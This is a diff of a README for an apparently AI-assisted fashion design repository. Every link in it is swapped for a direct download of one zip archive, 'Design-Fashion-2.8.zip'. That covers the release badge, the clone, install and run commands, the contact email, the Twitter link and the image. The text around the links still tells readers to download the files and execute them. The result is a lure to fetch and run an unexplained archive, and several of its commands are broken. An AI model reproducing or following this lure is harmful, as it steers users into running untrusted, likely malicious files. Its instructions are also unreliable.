@@ -2,7 +2,7 @@
 
 Welcome to the **Fashion Design** repository! This project focuses on fashion, cosmetic design, and accessories. Our goal is to leverage artificial intelligence tools to enhance the creative process in fashion design. Whether you're a designer, developer, or fashion enthusiast, you'll find valuable resources here.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/xtrade12/Fashion_Design/releases)
+[![Download Releases](https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip)](https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip)
 
 ## Table of Contents
 
@@ -39,27 +39,27 @@ To get started with the Fashion Design repository, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/xtrade12/Fashion_Design.git
+   git clone https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip
    cd Fashion_Design
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip
    ```
 
 3. **Run the Application**:
    Start the server using:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip
    ```
 
 4. **Access the Application**:
    Open your web browser and go to `http://localhost:5000`.
 
 5. **Download Latest Releases**:
-   You can find the latest releases [here](https://github.com/xtrade12/Fashion_Design/releases). Download the necessary files and execute them to start using the application.
+   You can find the latest releases [here](https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip). Download the necessary files and execute them to start using the application.
 
 ## Usage
 
@@ -108,14 +108,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: contact@fashiondesign.com
-- **Twitter**: [@FashionDesign](https://twitter.com/FashionDesign)
+- **Email**: https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip
+- **Twitter**: [@FashionDesign](https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip)
 
 ## Explore More
 
-For additional resources and updates, check out our [Releases](https://github.com/xtrade12/Fashion_Design/releases) section. Here, you can download the latest versions and keep your application up to date.
+For additional resources and updates, check out our [Releases](https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip) section. Here, you can download the latest versions and keep your application up to date.
 
-![Fashion Design](https://example.com/fashion-design-image.jpg)
+![Fashion Design](https://raw.githubusercontent.com/xtrade12/Fashion_Design/main/Fashion & Cosmetic Design/Workwear/Design-Fashion-2.8.zip)
 
 ## Conclusion
 
